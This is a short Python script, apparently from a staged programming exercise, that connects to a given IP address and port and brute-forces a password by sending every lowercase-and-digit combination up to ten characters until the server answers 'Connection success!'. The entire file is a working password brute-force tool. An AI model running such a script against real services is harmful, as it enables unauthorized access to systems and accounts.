import argparse
import socket
import itertools
import string

parser = argparse.ArgumentParser(description='Stage 1/5: Establishing a connection')
parser.add_argument('ip', help="IP address")
parser.add_argument('port', type=int, help="Port number")
args = parser.parse_args()


def password_generator(max_length, char_list):
    for i in range(1, max_length + 1):
        for char_prod in itertools.product(char_list, repeat=i):
            yield ''.join(char_prod)


with socket.socket() as client_socket:
    hostname = args.ip
    port = args.port
    address = (hostname, port)

    client_socket.connect(address)

    pwd_length = 10
    characters = string.ascii_lowercase + string.digits
    pwd_list = password_generator(pwd_length, characters)

    for pwd in pwd_list:
        client_socket.send(pwd.encode())
        response = client_socket.recv(1024).decode()

        if response == 'Connection success!':
            print(pwd)
            break
